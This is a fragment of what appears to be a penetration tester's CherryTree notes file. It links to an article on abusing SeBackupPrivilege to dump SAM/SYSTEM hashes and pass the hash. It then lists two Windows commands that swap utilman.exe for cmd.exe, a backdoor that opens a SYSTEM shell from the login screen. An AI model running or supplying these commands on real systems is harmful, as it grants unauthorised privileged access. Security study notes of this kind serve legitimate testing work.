        <rich_text link="webs https://juggernaut-sec.com/sebackupprivilege/#Exfiltrating_the_SAM_and_SYSTEM_Files_Dumping_the_Hashes_and_Performing_a_Pass-the-Hash_Attack_to_Escalate_to_SYSTEM">https://juggernaut-sec.com/sebackupprivilege/#Exfiltrating_the_SAM_and_SYSTEM_Files_Dumping_the_Hashes_and_Performing_a_Pass-the-Hash_Attack_to_Escalate_to_SYSTEM</rich_text>
        <codebox char_offset="366" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">move C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.old
move C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe</codebox>
      </node>
    </node>
  </node>
</cherrytree>
